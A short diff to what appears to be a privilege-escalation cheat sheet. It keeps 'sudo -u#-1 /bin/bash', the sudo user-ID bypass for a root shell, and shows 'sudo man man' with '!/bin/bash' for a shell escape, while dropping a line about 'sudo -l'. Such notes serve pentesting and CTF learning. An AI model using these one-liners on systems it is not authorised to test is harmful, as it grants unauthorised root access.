@@ -2,8 +2,7 @@
 use at your own risk
 
 ---
-`sudo -u#-1 /bin/bash` \
-You can use sudo -l to specify what you can run as sudo
+`sudo -u#-1 /bin/bash`
 
 ---
 `sudo man man` then type `!/bin/bash` \
